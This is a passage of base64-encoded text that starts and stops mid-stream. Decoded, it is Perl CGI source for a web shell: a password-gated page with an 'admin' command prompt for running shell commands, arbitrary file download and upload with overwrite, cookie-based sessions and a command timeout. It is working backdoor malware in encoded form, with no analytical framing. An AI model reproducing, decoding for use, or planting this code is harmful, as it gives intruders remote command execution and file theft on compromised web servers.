9naW4gOiBBZG1pbmlzdHJhdG9yPGJyPg0KDQpQYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KTG9naW4gOiBBZG1pbmlzdHJhdG9yPGJyPg0KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KCXByaW50ICI8YnI+PGZvbnQgY29sb3I9cmVkPm8tLS1bICA8Zm9udCBjb2xvcj0jZmY5OTAwPkVkaXQgYnkgJEVkaXRQZXJzaW9uIDwvZm9udD4gIF0tLS1vPC9mb250PjwvY29kZT48L2NlbnRlcj48L2JvZHk+PC9odG1sPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUNCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9nb3V0DQp7DQoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQ0KCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkmUHJpbnRMb2dvdXRTY3JlZW47DQoNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCglleGl0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyOw0KCQlwcmludCAmTGlzdERpcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoNCgkJfQ0KCQkmUHJpbnRMb2dpbkZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KCW15ICRkaXI9ICI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImNvbW1hbmQiKS4iPC9zcGFuPiI7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nIzY2ZmY2Nic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNTAiIG5hbWU9ImMiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQidHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IA0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KCW15ICRkaXI9ICZBZGRMaW5rRGlyKCJ1cGxvYWQiKTsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIGlkPSJ1cCIgdmFsdWU9Im92ZXJ3cml0ZSI+DQo8bGFiZWwgZm9yPSJ1cCI+T3ZlcndyaXRlIGlmIGl0IEV4aXN0czwvbGFiZWw+PGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KDQo8L2Zvcm0+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvDQojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMNCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCQlyZXR1cm4gPDxFTkQ7DQo8L3RleHRhcmVhPg0KPGJyPjxmb250IGNvbG9yPXllbGxvdz4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS48L2ZvbnQ+DQo8YnI+PGZvbnQgc2l6ZT0nNicgY29sb3I9cmVkPktpbGxlZCBpdCE8L2ZvbnQ+DQpFTkQNCgl9DQp9DQoNCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gZGlzcGxheXMgdGhlIHBhZ2UgdGhhdCBjb250YWlucyBhIGxpbmsgd2hpY2ggYWxsb3dzIHRoZSB1c2VyDQojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaA0KIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5Lg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgZmlsZW5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQ0Kew0KCWxvY2FsKCRGaWxlVXJsKSA9IEBfOw0KCW15ICRyZXN1bHQ9IiI7DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRyZXN1bHQgLj0gPDxFTkQ7DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPg0KRU5EDQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJfQ0KCWVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOw0KCQkkcmVzdWx0IC49ICZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KCW15ICRyZXN1bHQgPSAiIjsNCglsb2NhbCgkU2VuZEZpbGUpID0gQF87DQoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZw0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQliaW5tb2RlKFNFTkRGSUxFKTsNCgkJCWJpbm1vZGUoU1RET1VUKTsNCgkJfQ0KCQkkRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsNCgkJKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gIG0hKFteL15cXF0qKSQhOw0KCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQoJCXByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOw0KCQlwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9JDFcblxuIjsNCgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQoJCWNsb3NlKFNFTkRGSUxFKTsNCgkJZXhpdCgxKTsNCgl9DQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsNCgkJJHJlc3VsdCAuPSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQlyZXR1cm4gJlByaW50RmlsZVVwbG9hZEZvcm07DQoNCgl9DQoJbXkgJHJlc3VsdD0iIjsNCgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KCSRyZXN1bHQgLj0gIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgllbHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsNCgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KCQkJJHJlc3VsdCAuPSAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJHJlc3VsdCAuPSAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCgkNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8ICghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJcmV0dXJuICZTZW5kRmlsZ